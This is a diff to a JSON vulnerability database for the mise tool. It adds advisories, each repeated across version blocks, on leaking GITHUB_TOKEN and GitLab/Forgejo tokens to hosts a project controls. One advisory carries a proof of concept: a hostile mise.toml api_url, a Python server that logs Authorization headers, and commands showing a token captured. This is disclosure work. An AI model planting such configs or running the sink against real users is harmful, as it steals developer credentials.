+                "description": "## Summary a `github:` tool can carry an `api_url` option and mise take it from the project config with no check on the origin. so if i put a hostile api_url in a repo and you run mise in it while you have a GITHUB_TOKEN in your env, mise send your token as `Authorization: Bearer` to my url. a repo you just clone read your github token, and it fire even under MISE_SAFE=1. ## Details i went look where the url come from. `api_url` is read straight from the tool options, no allowlist, `src/backend/github.rs:92`: ```rust fn api_url(&self) -> String { self.values .str('api_url') .unwrap_or(self.default_api_url) .to_string() } ``` then mise decide if a host is a github api only from the path, so `http://attacker.tld/api/v3` count as a GHES api, `crates/mise-util/src/github.rs:878`: ```rust pub fn is_github_api_url(url: &url::Url) -> bool { let Some(host) = url.host_str() else { return false; }; host == 'api.github.com' || is_ghe_com_api_host(host) || (host != 'github.com' && !host.ends_with('.githubusercontent.com') && !host.ends_with('.ghe.com') && is_ghes_api_path(url.path())) } ``` and the token resolver, for a host that is not github.com, skip only the enterprise var then fall back to the plain GITHUB_TOKEN for any host, `crates/mise-util/src/github.rs:1208`: ```rust if !is_ghcom && let Some(token) = env::scoped_var('MISE_GITHUB_ENTERPRISE_TOKEN') { return Some((token, TokenSource::EnvVar('MISE_GITHUB_ENTERPRISE_TOKEN'))); } for var_name in GITHUB_TOKEN_ENV_VARS { if let Some(token) = env::scoped_var(var_name) { return Some((token, TokenSource::EnvVar(var_name))); } } ``` `GITHUB_TOKEN_ENV_VARS` is `['MISE_GITHUB_TOKEN', 'GITHUB_API_TOKEN', 'GITHUB_TOKEN']`, nothing tie them to the github host, and `get_headers` put that token in the Bearer for my url. last thing, the config don't ask trust. a `mise.toml` with plain string `[tools]` values is classified safe, and the check look only the values, never the key, `src/config/config_file/mise_toml.rs:3010`: ```rust table.iter().all(|(key, value)| match key.as_str() { 'min_version' | 'tasks' => true, 'tools' => value.as_table().is_some_and(|tools| { tools.values().all(|version| match version { toml::Value::String(_) => true, toml::Value::Array(versions) => { versions.iter().all(|v| matches!(v, toml::Value::String(_))) } _ => false, }) }), _ => false, }) ``` so `'github:owner/repo[api_url=...]' = 'latest'` is a string value, the file pass safe, and the api_url in the key is parsed after by BackendArg and reach the backend. there no prompt anywhere. ## PoC mise v2026.9.17 (sha256 63049bc35fb9065e8dc35ac8b25fdae53e9bd6f1885a843aedeba398e046a1ee), the files above are identical on current main. the hostile project, `proj/mise.toml`: ```toml [tools] 'github:sharkdp/fd[api_url=http://127.0.0.1:8080/api/v3]' = 'latest' ``` a tiny server that stand for my host and just log what it get, `sink.py`: ```python import http.server, sys class H(http.server.BaseHTTPRequestHandler): def do_GET(self): sys.stderr.write('%s Authorization: %s\\n' % (self.path, self.headers.get('Authorization'))) body = b'{'tag_name':'v0.0.1','draft':false,'prerelease':false,'assets':[]}' if self.path.endswith('/releases/latest') else b'[]' self.send_response(200); self.send_header('Content-Length', str(len(body))); self.end_headers(); self.wfile.write(body) def log_message(self, *a): pass http.server.HTTPServer(('127.0.0.1', 8080), H).serve_forever() ``` i put a github token in the env : ```bash /tmp/mise-lab \u276f python3 sink.py 2>sink.log & /tmp/mise-lab \u276f cd proj /tmp/mise-lab/proj \u276f export GITHUB_TOKEN=ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U /tmp/mise-lab/proj \u276f mise install /tmp/mise-lab/proj \u276f MISE_SAFE=1 mise install /tmp/mise-lab/proj \u276f mise ls-remote 'github:sharkdp/fd[api_url=http://127.0.0.1:8080/api/v3]' ``` what my server got, per command: ```text mise install /api/v3/repos/sharkdp/fd/releases/latest Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U /api/v3/repos/sharkdp/fd/releases?per_page=100 Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U MISE_SAFE=1 mise install /api/v3/repos/sharkdp/fd/releases/latest Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U mise ls-remote /api/v3/repos/sharkdp/fd/releases?per_page=100 Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U ``` also a https host work the same ## Impact a repo you clone can read your GITHUB_TOKEN and send it to a host it choose",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.5.10-r0",
+                        "fixed": "2026.9.18-r0"
+                    }
+                ]
+            },
+            "GHSA-43hx-4j66-v486": {
+                "cve_id": "GHSA-43hx-4j66-v486",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.5.10-r0",
+                        "fixed": "2026.10.24-r0"
+                    }
+                ]
+            },
+            "GHSA-fh4m-2w73-96r9": {
+                "cve_id": "GHSA-fh4m-2w73-96r9",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.5.10-r0",
+                        "fixed": "2026.10.24-r0"
+                    }
+                ]
+            },
+            "GHSA-r9rm-ppfv-c993": {
+                "cve_id": "GHSA-r9rm-ppfv-c993",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.12.13-r1",
+                        "fixed": "2026.10.24-r0"
+                    }
+                ]
+            },
+            "GHSA-w8pw-h853-frw2": {
+                "cve_id": "GHSA-w8pw-h853-frw2",
+                "title": "GitLab/Forgejo tokens are attached to release-asset URLs on hosts mise does not control",
+                "description": "# GitLab/Forgejo tokens are attached to release-asset URLs on hosts mise does not control ## Summary `gitlab::get_headers` and `forgejo::get_headers` attach the caller's token to **any** URL they are handed. The GitHub equivalent does not \u2014 it self-gates on `is_github_api_url`, and `github::resolve_token` additionally refuses the release-asset hosts. All three are called side by side, on the same value, in `src/backend/github.rs`, so the GitHub path is protected and the other two are not. A GitLab release asset link may name any host. When the linked asset is on a third-party host, mise sends `Authorization: Bearer <GITLAB_TOKEN>` to that host. ## The asymmetry `src/github.rs` ```rust pub fn get_headers<U: IntoUrl>(url: U) -> Result<HeaderMap> { ... if is_github_api_url(&url) { // <- gate let host = url.host_str().unwrap_or('github.com'); if let Some((token, source)) = resolve_token(host) { ... } } } pub fn resolve_token(host: &str) -> Option<(String, TokenSource)> { if is_github_release_asset_host(host) { // <- second gate return None; } ``` `src/gitlab.rs:265` \u2014 no gate: ```rust pub fn get_headers<U: IntoUrl>(url: U) -> HeaderMap { let mut headers = HeaderMap::new(); let Ok(url) = url.into_url() else { return headers }; let lookup_host = url.host_str().unwrap_or('gitlab.com'); if let Some((token, _source)) = resolve_token(lookup_host) { headers.insert(AUTHORIZATION, HeaderValue::from_str(format!('Bearer {token}'))...); } headers } ``` `src/forgejo.rs:163` is the same shape. `resolve_token` cannot compensate, because its env-var branch is host-independent \u2014 there is no host comparison on it: ```rust // src/gitlab.rs, resolve_token, step 2 for var_name in &['MISE_GITLAB_TOKEN', 'GITLAB_TOKEN'] { if let Some(token) = std::env::var(var_name).ok()... { return Some((token, TokenSource::EnvVar(var_name))); } } ``` So for a host the user has never configured anywhere, `resolve_token` still returns the environment token, and `get_headers` still attaches it. ## Where the normal gate is bypassed `http.rs::host_auth_headers` gates correctly: ```rust let is_gitlab = host == 'gitlab.com' || crate::gitlab::is_gitlab_host(host); if is_gitlab { return Ok(crate::gitlab::get_headers(url.as_str())); } ``` `src/backend/github.rs` does not go through it. It calls the three `get_headers` functions directly at three sites \u2014 1173 (`verify_provenance_at_lock_time`), 1416 and 1523 (the two download paths) \u2014 each on a URL that can be `asset.url`, populated from the release JSON at `:1951` and `:1983`: ```rust url: asset.direct_asset_url.clone(), ``` ## What I measured, and the limit of it I want to be precise here, because my first reading of this overstated it. `direct_asset_url` is **usually** a gitlab.com permalink \u2014 GitLab generates one when the release link was created with a `filepath`. In that common case mise is talking to gitlab.com and the token is going where it should. Sampling the live API today: | project | links | `direct_asset_url` host | |---|---:|---| | gitlab-org/gitlab-runner | 38 | `gitlab.com` (while `url` is `gitlab-runner-downloads.s3.amazonaws.com`) | | graphviz/graphviz | 90 | `gitlab.com` | | fdroid/fdroidclient | 4 | `gitlab.com` | | gitlab-org/cli | 36 | `gitlab.com` | | **inkscape/inkscape** | 1 | **`inkscape.org`** | So the exposure is real but not universal: it is the links published **without** a `filepath`, where `direct_asset_url` is just the publisher's own URL. `inkscape.org` above is a live example on a well-known project. Reachability: this needs the GitLab backend, i.e. `mise use gitlab:<ns>/<project>`, which is documented usage. It is not reachable through the shipped registry today \u2014 the only `gitlab:` entry is `glab` \u2192 `gitlab-org/cli`, whose links are permalinked and therefore unaffected. ## Impact 1. **Accidental leak, no attacker needed.** Any user with `GITLAB_TOKEN` / `MISE_GITLAB_TOKEN` exported who installs a GitLab-backed tool whose release links are not permalinked sends that token to the third-party download host on every install and on every lock-time provenance check. 2. **Deliberate exfiltration.** A project reachable via `mise use gitlab:...` can publish a release link pointing at a host it controls and collect the tokens of everyone who installs it. No prior trust relationship with that host is required, because the env-var branch ignores the host entirely. The same applies to Forgejo/Codeberg via `MISE_FORGEJO_TOKEN` / `FORGEJO_TOKEN`. This also contradicts a principle the codebase states elsewhere \u2014 `http.rs`, on URL replacement: *'the existing auth header was built for the original host and is likely wrong for the replacement target'*. ## Suggested fixes Two options; which one is right is a design call I'd rather leave to you. **A \u2014 mirror GitHub, minimal diff.** Gate inside `gitlab::get_headers` / `forgejo::get_headers` exactly as `http.rs` already gates them: ```rust let is_ours = lookup_host == 'gitlab.com' || is_gitlab_host(lookup_host); if is_ours && let Some((token, _)) = resolve_token(lookup_host) { ... } ``` Caveat worth weighing before taking it: a self-hosted GitLab whose token is supplied **only** through `GITLAB_TOKEN` is in neither `MISE_GITLAB_TOKENS` nor `GLAB_HOSTS`, so `is_gitlab_host` returns false and that setup would silently stop being authenticated. That is a behaviour change for a legitimate configuration. **B \u2014 compare against the instance actually being talked to.** The backend already has the API base (`opts.api_url()`); attach the token only when the download URL's host equals that base's host. Keeps self-hosted-via-env-var working and is tighter than A, at the cost of threading one argument through the three call sites. ## How this was verified - Code reading of the paths quoted above, at `93a5786`. - Live GitLab API sampling for the `direct_asset_url` table. - I did **not** run a network proof-of-concept against any third-party host, and would not without your say-so. - I could not execute mise's own test suite locally to add a regression test: the `libz-ng-sys` build script invokes CMake through w64devkit's `make`/`sh`, which fails to exec `cmake.exe` on this Windows/GNU toolchain. That is my environment's problem, not yours \u2014 I mention it only so you know the finding rests on reading plus the API data above, not on a test run. Happy to send the fix as a PR once you say which option you want. ## Reporter Nguyen Thanh Dat \u2014 GitHub `@ntdatt812` --- ## Addendum \u2014 the same root cause reached through pagination Adding this because it changes *where* the fix belongs, not because it is a stronger attack. It is a variant, with a narrower precondition, and I want to be clear about that. All three modules re-derive auth for each page (`gitlab.rs` even documents why \u2014 the `#6318` defect where page 2 went out unauthenticated). The next-page URL comes from the `Link` header: ```rust // src/http.rs:1709 pub(crate) fn resolve_pagination_url(current: &str, next: &str) -> Result<String> { if next.starts_with('http://') || next.starts_with('https://') { return Ok(next.to_string()); // absolute Link is taken as-is } ``` So a response can point the next request at any host, including a downgrade to plain `http://`. What happens then differs per backend, for exactly the reason in this report: | backend | page-2 URL on an unrelated host | |---|---| | `github.rs:210` | `get_headers` gates on `is_github_api_url` \u2192 **no token attached** | | `gitlab.rs:137` | no gate \u2192 token attached | | `forgejo.rs:112` | no gate, and it uses `next` directly without `resolve_pagination_url` | **Precondition, stated plainly:** the `Link` header comes from the forge instance being queried, so this needs an instance that is malicious, compromised, or fronted by something that can inject a response header \u2014 or a MITM on an `http://` API base. An honest gitlab.com is not affected. That is why I rate it below the release-asset path in the main report, not above it. **Why it still matters for the fix:** it shows the gate cannot live at the three `src/backend/github.rs` call sites. Any caller that hands `gitlab::get_headers` / `forgejo::get_headers` a URL from a response \u2014 a `Link` header today, something else later \u2014 reintroduces this. Options A and B both close it, because both put the host check inside `get_headers`. A patch applied only at the asset call sites would not. Same verification basis as the rest of this report: code reading at `93a5786`, no network proof-of-concept.",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.5.10-r0",
+                        "fixed": "2026.8.15-r0"
+                    }
+                ]
+            },
+            "GHSA-wcqh-j26q-g44x": {
+                "cve_id": "GHSA-wcqh-j26q-g44x",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.5.10-r0",
+                        "fixed": "2026.10.24-r0"
                     }
                 ]
             }
@@ -294,19 +489,6 @@
                     }
                 ]
             },
-            "CVE-2026-55448": {
-                "cve_id": "CVE-2026-55448",
-                "title": "mise manages dev tools like node, python, cmake, and terraform. F ...",
-                "description": "mise manages dev tools like node, python, cmake, and terraform. From 2026.3.15 until 2026.6.4, mise loads github.credential_command from local project config before any trust decision, then executes that value with sh -c when resolving a GitHub token. An attacker who can place a .mise.toml in a repository can execute arbitrary shell commands when the victim runs a GitHub-related mise command and no higher-priority GitHub token environment variable is set. This vulnerability is fixed in 2026.6.4.",
-                "severity": "MEDIUM",
-                "status": "fixed",
-                "events": [
-                    {
-                        "introduced": "2025.8.20-r0",
-                        "fixed": "2026.6.11-r0"
-                    }
-                ]
-            },
             "CVE-2026-71477": {
                 "cve_id": "CVE-2026-71477",
                 "title": "mise manages dev tools like node, python, cmake, and terraform. P ...",
@@ -317,6 +499,84 @@
                     {
                         "introduced": "2025.8.20-r0",
                         "fixed": "2026.7.4-r0"
+                    }
+                ]
+            },
+            "GHSA-333c-h2jr-xv83": {
+                "cve_id": "GHSA-333c-h2jr-xv83",
+                "title": "Mise vulnerable to GITHUB_TOKEN exfiltration via a project controlled github api_url",
+                "description": "## Summary a `github:` tool can carry an `api_url` option and mise take it from the project config with no check on the origin. so if i put a hostile api_url in a repo and you run mise in it while you have a GITHUB_TOKEN in your env, mise send your token as `Authorization: Bearer` to my url. a repo you just clone read your github token, and it fire even under MISE_SAFE=1. ## Details i went look where the url come from. `api_url` is read straight from the tool options, no allowlist, `src/backend/github.rs:92`: ```rust fn api_url(&self) -> String { self.values .str('api_url') .unwrap_or(self.default_api_url) .to_string() } ``` then mise decide if a host is a github api only from the path, so `http://attacker.tld/api/v3` count as a GHES api, `crates/mise-util/src/github.rs:878`: ```rust pub fn is_github_api_url(url: &url::Url) -> bool { let Some(host) = url.host_str() else { return false; }; host == 'api.github.com' || is_ghe_com_api_host(host) || (host != 'github.com' && !host.ends_with('.githubusercontent.com') && !host.ends_with('.ghe.com') && is_ghes_api_path(url.path())) } ``` and the token resolver, for a host that is not github.com, skip only the enterprise var then fall back to the plain GITHUB_TOKEN for any host, `crates/mise-util/src/github.rs:1208`: ```rust if !is_ghcom && let Some(token) = env::scoped_var('MISE_GITHUB_ENTERPRISE_TOKEN') { return Some((token, TokenSource::EnvVar('MISE_GITHUB_ENTERPRISE_TOKEN'))); } for var_name in GITHUB_TOKEN_ENV_VARS { if let Some(token) = env::scoped_var(var_name) { return Some((token, TokenSource::EnvVar(var_name))); } } ``` `GITHUB_TOKEN_ENV_VARS` is `['MISE_GITHUB_TOKEN', 'GITHUB_API_TOKEN', 'GITHUB_TOKEN']`, nothing tie them to the github host, and `get_headers` put that token in the Bearer for my url. last thing, the config don't ask trust. a `mise.toml` with plain string `[tools]` values is classified safe, and the check look only the values, never the key, `src/config/config_file/mise_toml.rs:3010`: ```rust table.iter().all(|(key, value)| match key.as_str() { 'min_version' | 'tasks' => true, 'tools' => value.as_table().is_some_and(|tools| { tools.values().all(|version| match version { toml::Value::String(_) => true, toml::Value::Array(versions) => { versions.iter().all(|v| matches!(v, toml::Value::String(_))) } _ => false, }) }), _ => false, }) ``` so `'github:owner/repo[api_url=...]' = 'latest'` is a string value, the file pass safe, and the api_url in the key is parsed after by BackendArg and reach the backend. there no prompt anywhere. ## PoC mise v2026.9.17 (sha256 63049bc35fb9065e8dc35ac8b25fdae53e9bd6f1885a843aedeba398e046a1ee), the files above are identical on current main. the hostile project, `proj/mise.toml`: ```toml [tools] 'github:sharkdp/fd[api_url=http://127.0.0.1:8080/api/v3]' = 'latest' ``` a tiny server that stand for my host and just log what it get, `sink.py`: ```python import http.server, sys class H(http.server.BaseHTTPRequestHandler): def do_GET(self): sys.stderr.write('%s Authorization: %s\\n' % (self.path, self.headers.get('Authorization'))) body = b'{'tag_name':'v0.0.1','draft':false,'prerelease':false,'assets':[]}' if self.path.endswith('/releases/latest') else b'[]' self.send_response(200); self.send_header('Content-Length', str(len(body))); self.end_headers(); self.wfile.write(body) def log_message(self, *a): pass http.server.HTTPServer(('127.0.0.1', 8080), H).serve_forever() ``` i put a github token in the env : ```bash /tmp/mise-lab \u276f python3 sink.py 2>sink.log & /tmp/mise-lab \u276f cd proj /tmp/mise-lab/proj \u276f export GITHUB_TOKEN=ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U /tmp/mise-lab/proj \u276f mise install /tmp/mise-lab/proj \u276f MISE_SAFE=1 mise install /tmp/mise-lab/proj \u276f mise ls-remote 'github:sharkdp/fd[api_url=http://127.0.0.1:8080/api/v3]' ``` what my server got, per command: ```text mise install /api/v3/repos/sharkdp/fd/releases/latest Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U /api/v3/repos/sharkdp/fd/releases?per_page=100 Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U MISE_SAFE=1 mise install /api/v3/repos/sharkdp/fd/releases/latest Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U mise ls-remote /api/v3/repos/sharkdp/fd/releases?per_page=100 Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U ``` also a https host work the same ## Impact a repo you clone can read your GITHUB_TOKEN and send it to a host it choose",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.8.20-r0",
+                        "fixed": "2026.9.18-r0"
+                    }
+                ]
+            },
+            "GHSA-43hx-4j66-v486": {
+                "cve_id": "GHSA-43hx-4j66-v486",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.8.20-r0",
+                        "fixed": "2026.10.24-r0"
+                    }
+                ]
+            },
+            "GHSA-fh4m-2w73-96r9": {
+                "cve_id": "GHSA-fh4m-2w73-96r9",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.8.20-r0",
+                        "fixed": "2026.10.24-r0"
+                    }
+                ]
+            },
+            "GHSA-r9rm-ppfv-c993": {
+                "cve_id": "GHSA-r9rm-ppfv-c993",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.12.13-r1",
+                        "fixed": "2026.10.24-r0"
+                    }
+                ]
+            },
+            "GHSA-w8pw-h853-frw2": {
+                "cve_id": "GHSA-w8pw-h853-frw2",
+                "title": "GitLab/Forgejo tokens are attached to release-asset URLs on hosts mise does not control",
+                "description": "# GitLab/Forgejo tokens are attached to release-asset URLs on hosts mise does not control ## Summary `gitlab::get_headers` and `forgejo::get_headers` attach the caller's token to **any** URL they are handed. The GitHub equivalent does not \u2014 it self-gates on `is_github_api_url`, and `github::resolve_token` additionally refuses the release-asset hosts. All three are called side by side, on the same value, in `src/backend/github.rs`, so the GitHub path is protected and the other two are not. A GitLab release asset link may name any host. When the linked asset is on a third-party host, mise sends `Authorization: Bearer <GITLAB_TOKEN>` to that host. ## The asymmetry `src/github.rs` ```rust pub fn get_headers<U: IntoUrl>(url: U) -> Result<HeaderMap> { ... if is_github_api_url(&url) { // <- gate let host = url.host_str().unwrap_or('github.com'); if let Some((token, source)) = resolve_token(host) { ... } } } pub fn resolve_token(host: &str) -> Option<(String, TokenSource)> { if is_github_release_asset_host(host) { // <- second gate return None; } ``` `src/gitlab.rs:265` \u2014 no gate: ```rust pub fn get_headers<U: IntoUrl>(url: U) -> HeaderMap { let mut headers = HeaderMap::new(); let Ok(url) = url.into_url() else { return headers }; let lookup_host = url.host_str().unwrap_or('gitlab.com'); if let Some((token, _source)) = resolve_token(lookup_host) { headers.insert(AUTHORIZATION, HeaderValue::from_str(format!('Bearer {token}'))...); } headers } ``` `src/forgejo.rs:163` is the same shape. `resolve_token` cannot compensate, because its env-var branch is host-independent \u2014 there is no host comparison on it: ```rust // src/gitlab.rs, resolve_token, step 2 for var_name in &['MISE_GITLAB_TOKEN', 'GITLAB_TOKEN'] { if let Some(token) = std::env::var(var_name).ok()... { return Some((token, TokenSource::EnvVar(var_name))); } } ``` So for a host the user has never configured anywhere, `resolve_token` still returns the environment token, and `get_headers` still attaches it. ## Where the normal gate is bypassed `http.rs::host_auth_headers` gates correctly: ```rust let is_gitlab = host == 'gitlab.com' || crate::gitlab::is_gitlab_host(host); if is_gitlab { return Ok(crate::gitlab::get_headers(url.as_str())); } ``` `src/backend/github.rs` does not go through it. It calls the three `get_headers` functions directly at three sites \u2014 1173 (`verify_provenance_at_lock_time`), 1416 and 1523 (the two download paths) \u2014 each on a URL that can be `asset.url`, populated from the release JSON at `:1951` and `:1983`: ```rust url: asset.direct_asset_url.clone(), ``` ## What I measured, and the limit of it I want to be precise here, because my first reading of this overstated it. `direct_asset_url` is **usually** a gitlab.com permalink \u2014 GitLab generates one when the release link was created with a `filepath`. In that common case mise is talking to gitlab.com and the token is going where it should. Sampling the live API today: | project | links | `direct_asset_url` host | |---|---:|---| | gitlab-org/gitlab-runner | 38 | `gitlab.com` (while `url` is `gitlab-runner-downloads.s3.amazonaws.com`) | | graphviz/graphviz | 90 | `gitlab.com` | | fdroid/fdroidclient | 4 | `gitlab.com` | | gitlab-org/cli | 36 | `gitlab.com` | | **inkscape/inkscape** | 1 | **`inkscape.org`** | So the exposure is real but not universal: it is the links published **without** a `filepath`, where `direct_asset_url` is just the publisher's own URL. `inkscape.org` above is a live example on a well-known project. Reachability: this needs the GitLab backend, i.e. `mise use gitlab:<ns>/<project>`, which is documented usage. It is not reachable through the shipped registry today \u2014 the only `gitlab:` entry is `glab` \u2192 `gitlab-org/cli`, whose links are permalinked and therefore unaffected. ## Impact 1. **Accidental leak, no attacker needed.** Any user with `GITLAB_TOKEN` / `MISE_GITLAB_TOKEN` exported who installs a GitLab-backed tool whose release links are not permalinked sends that token to the third-party download host on every install and on every lock-time provenance check. 2. **Deliberate exfiltration.** A project reachable via `mise use gitlab:...` can publish a release link pointing at a host it controls and collect the tokens of everyone who installs it. No prior trust relationship with that host is required, because the env-var branch ignores the host entirely. The same applies to Forgejo/Codeberg via `MISE_FORGEJO_TOKEN` / `FORGEJO_TOKEN`. This also contradicts a principle the codebase states elsewhere \u2014 `http.rs`, on URL replacement: *'the existing auth header was built for the original host and is likely wrong for the replacement target'*. ## Suggested fixes Two options; which one is right is a design call I'd rather leave to you. **A \u2014 mirror GitHub, minimal diff.** Gate inside `gitlab::get_headers` / `forgejo::get_headers` exactly as `http.rs` already gates them: ```rust let is_ours = lookup_host == 'gitlab.com' || is_gitlab_host(lookup_host); if is_ours && let Some((token, _)) = resolve_token(lookup_host) { ... } ``` Caveat worth weighing before taking it: a self-hosted GitLab whose token is supplied **only** through `GITLAB_TOKEN` is in neither `MISE_GITLAB_TOKENS` nor `GLAB_HOSTS`, so `is_gitlab_host` returns false and that setup would silently stop being authenticated. That is a behaviour change for a legitimate configuration. **B \u2014 compare against the instance actually being talked to.** The backend already has the API base (`opts.api_url()`); attach the token only when the download URL's host equals that base's host. Keeps self-hosted-via-env-var working and is tighter than A, at the cost of threading one argument through the three call sites. ## How this was verified - Code reading of the paths quoted above, at `93a5786`. - Live GitLab API sampling for the `direct_asset_url` table. - I did **not** run a network proof-of-concept against any third-party host, and would not without your say-so. - I could not execute mise's own test suite locally to add a regression test: the `libz-ng-sys` build script invokes CMake through w64devkit's `make`/`sh`, which fails to exec `cmake.exe` on this Windows/GNU toolchain. That is my environment's problem, not yours \u2014 I mention it only so you know the finding rests on reading plus the API data above, not on a test run. Happy to send the fix as a PR once you say which option you want. ## Reporter Nguyen Thanh Dat \u2014 GitHub `@ntdatt812` --- ## Addendum \u2014 the same root cause reached through pagination Adding this because it changes *where* the fix belongs, not because it is a stronger attack. It is a variant, with a narrower precondition, and I want to be clear about that. All three modules re-derive auth for each page (`gitlab.rs` even documents why \u2014 the `#6318` defect where page 2 went out unauthenticated). The next-page URL comes from the `Link` header: ```rust // src/http.rs:1709 pub(crate) fn resolve_pagination_url(current: &str, next: &str) -> Result<String> { if next.starts_with('http://') || next.starts_with('https://') { return Ok(next.to_string()); // absolute Link is taken as-is } ``` So a response can point the next request at any host, including a downgrade to plain `http://`. What happens then differs per backend, for exactly the reason in this report: | backend | page-2 URL on an unrelated host | |---|---| | `github.rs:210` | `get_headers` gates on `is_github_api_url` \u2192 **no token attached** | | `gitlab.rs:137` | no gate \u2192 token attached | | `forgejo.rs:112` | no gate, and it uses `next` directly without `resolve_pagination_url` | **Precondition, stated plainly:** the `Link` header comes from the forge instance being queried, so this needs an instance that is malicious, compromised, or fronted by something that can inject a response header \u2014 or a MITM on an `http://` API base. An honest gitlab.com is not affected. That is why I rate it below the release-asset path in the main report, not above it. **Why it still matters for the fix:** it shows the gate cannot live at the three `src/backend/github.rs` call sites. Any caller that hands `gitlab::get_headers` / `forgejo::get_headers` a URL from a response \u2014 a `Link` header today, something else later \u2014 reintroduces this. Options A and B both close it, because both put the host check inside `get_headers`. A patch applied only at the asset call sites would not. Same verification basis as the rest of this report: code reading at `93a5786`, no network proof-of-concept.",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.8.20-r0",
+                        "fixed": "2026.8.15-r0"
+                    }
+                ]
+            },
+            "GHSA-wcqh-j26q-g44x": {
+                "cve_id": "GHSA-wcqh-j26q-g44x",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.8.20-r0",
+                        "fixed": "2026.10.24-r0"
                     }
                 ]
             }
@@ -374,19 +634,6 @@
                     }
                 ]
             },
-            "CVE-2026-55448": {
-                "cve_id": "CVE-2026-55448",
-                "title": "mise manages dev tools like node, python, cmake, and terraform. F ...",
-                "description": "mise manages dev tools like node, python, cmake, and terraform. From 2026.3.15 until 2026.6.4, mise loads github.credential_command from local project config before any trust decision, then executes that value with sh -c when resolving a GitHub token. An attacker who can place a .mise.toml in a repository can execute arbitrary shell commands when the victim runs a GitHub-related mise command and no higher-priority GitHub token environment variable is set. This vulnerability is fixed in 2026.6.4.",
-                "severity": "MEDIUM",
-                "status": "fixed",
-                "events": [
-                    {
-                        "introduced": "2025.12.13-r1",
-                        "fixed": "2026.6.11-r0"
-                    }
-                ]
-            },
             "CVE-2026-71477": {
                 "cve_id": "CVE-2026-71477",
                 "title": "mise manages dev tools like node, python, cmake, and terraform. P ...",
@@ -397,6 +644,84 @@
                     {
                         "introduced": "2025.12.13-r1",
                         "fixed": "2026.7.4-r0"
+                    }
+                ]
+            },
+            "GHSA-333c-h2jr-xv83": {
+                "cve_id": "GHSA-333c-h2jr-xv83",
+                "title": "Mise vulnerable to GITHUB_TOKEN exfiltration via a project controlled github api_url",
+                "description": "## Summary a `github:` tool can carry an `api_url` option and mise take it from the project config with no check on the origin. so if i put a hostile api_url in a repo and you run mise in it while you have a GITHUB_TOKEN in your env, mise send your token as `Authorization: Bearer` to my url. a repo you just clone read your github token, and it fire even under MISE_SAFE=1. ## Details i went look where the url come from. `api_url` is read straight from the tool options, no allowlist, `src/backend/github.rs:92`: ```rust fn api_url(&self) -> String { self.values .str('api_url') .unwrap_or(self.default_api_url) .to_string() } ``` then mise decide if a host is a github api only from the path, so `http://attacker.tld/api/v3` count as a GHES api, `crates/mise-util/src/github.rs:878`: ```rust pub fn is_github_api_url(url: &url::Url) -> bool { let Some(host) = url.host_str() else { return false; }; host == 'api.github.com' || is_ghe_com_api_host(host) || (host != 'github.com' && !host.ends_with('.githubusercontent.com') && !host.ends_with('.ghe.com') && is_ghes_api_path(url.path())) } ``` and the token resolver, for a host that is not github.com, skip only the enterprise var then fall back to the plain GITHUB_TOKEN for any host, `crates/mise-util/src/github.rs:1208`: ```rust if !is_ghcom && let Some(token) = env::scoped_var('MISE_GITHUB_ENTERPRISE_TOKEN') { return Some((token, TokenSource::EnvVar('MISE_GITHUB_ENTERPRISE_TOKEN'))); } for var_name in GITHUB_TOKEN_ENV_VARS { if let Some(token) = env::scoped_var(var_name) { return Some((token, TokenSource::EnvVar(var_name))); } } ``` `GITHUB_TOKEN_ENV_VARS` is `['MISE_GITHUB_TOKEN', 'GITHUB_API_TOKEN', 'GITHUB_TOKEN']`, nothing tie them to the github host, and `get_headers` put that token in the Bearer for my url. last thing, the config don't ask trust. a `mise.toml` with plain string `[tools]` values is classified safe, and the check look only the values, never the key, `src/config/config_file/mise_toml.rs:3010`: ```rust table.iter().all(|(key, value)| match key.as_str() { 'min_version' | 'tasks' => true, 'tools' => value.as_table().is_some_and(|tools| { tools.values().all(|version| match version { toml::Value::String(_) => true, toml::Value::Array(versions) => { versions.iter().all(|v| matches!(v, toml::Value::String(_))) } _ => false, }) }), _ => false, }) ``` so `'github:owner/repo[api_url=...]' = 'latest'` is 